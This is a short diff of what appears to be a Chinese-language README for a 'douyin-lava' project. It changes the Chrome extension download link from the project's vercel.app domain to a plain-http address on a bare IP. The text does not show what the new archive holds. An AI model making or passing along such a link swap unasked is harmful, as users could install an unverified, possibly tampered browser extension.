@@ -8,7 +8,7 @@
 
 🔗 **线上体验：** https://douyin-lava.vercel.app/
 
-🧩 **Chrome 扩展下载：** https://douyin-lava.vercel.app/lava-react.zip
+🧩 **Chrome 扩展下载：** http://8.218.184.116/lava-react.zip
 
 ---
 
